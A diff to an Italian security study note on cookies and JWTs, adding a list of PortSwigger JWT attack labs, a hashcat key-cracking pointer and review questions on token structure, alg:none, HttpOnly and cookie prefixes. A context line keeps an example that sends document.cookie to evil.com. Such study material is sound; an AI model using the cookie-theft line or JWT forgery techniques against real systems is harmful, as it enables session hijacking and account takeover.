@@ -3,7 +3,7 @@ tipo: concetto
 tag: [web, owasp]
 fase: 2
 fonti: 4
-aggiornato: 2026-06-20
+aggiornato: 2026-07-02
 stato: maturo
 aliases: ["Cookie e JWT"]
 
@@ -72,6 +72,21 @@ fetch('https://evil.com/?c=' + document.cookie)
 - Usare **secret key lunghe e casuali** (almeno 256 bit) per HMAC
 - Verificare sempre `exp` (scadenza) e `iss` (emittente)
 - Revocare i JWT compromessi tramite una denylist o usando scadenze brevi con refresh token
+
+## Lab
+- [[PortSwigger Web Academy]] → categoria **JWT attacks**. Percorso dal livello APPRENTICE:
+  - *JWT authentication bypass via unverified signature* — il server non verifica affatto la firma.
+  - *JWT authentication bypass via flawed signature verification* — accetta `alg: none`.
+  - *JWT authentication bypass via weak signing key* — brute force del segreto HS256 con wordlist.
+  - *...via jwk/kid header injection* e *via algorithm confusion* (PRACTITIONER) — abuso degli header del JWT.
+- Cosa esercitare: usare l'estensione **JWT Editor** di [[Burp Suite]] per alterare header/payload e ri-firmare; per il brute della chiave HS256 usare `hashcat -m 16500` come nell'esempio sopra.
+
+## Domande
+1. **D:** Da quali tre parti è composto un JWT e cosa contengono?  **R:** `header.payload.signature` (Base64url separate da punti): l'header indica l'algoritmo, il payload contiene i claim (dati), la firma garantisce l'integrità del token.
+2. **D:** Perché l'attacco `alg: none` è pericoloso?  **R:** Se il server accetta un JWT con algoritmo `none`, il token è valido senza firma: l'attaccante può forgiare qualunque payload (es. `role: admin`) e autenticarsi.
+3. **D:** Cosa protegge l'attributo `HttpOnly` di un cookie e da cosa NON protegge?  **R:** Impedisce a JavaScript di leggere il cookie (mitiga il furto via XSS); non protegge da CSRF né da sniffing di rete (per quelli servono `SameSite` e `Secure`).
+4. **D:** Perché un JWT è definito "stateless" e quale conseguenza ha sulla revoca?  **R:** Il server non memorizza la sessione, verifica solo la firma; quindi non può "cancellare" un token già emesso: serve una denylist o scadenze brevi con refresh token.
+5. **D:** A cosa servono i prefissi `__Secure-` e `__Host-` nei nomi dei cookie?  **R:** Impongono vincoli lato browser (es. `__Host-` richiede `Secure`, path `/` e niente `Domain`), rendendo il cookie più difficile da sovrascrivere o iniettare.
 
 ## Collegamenti
 
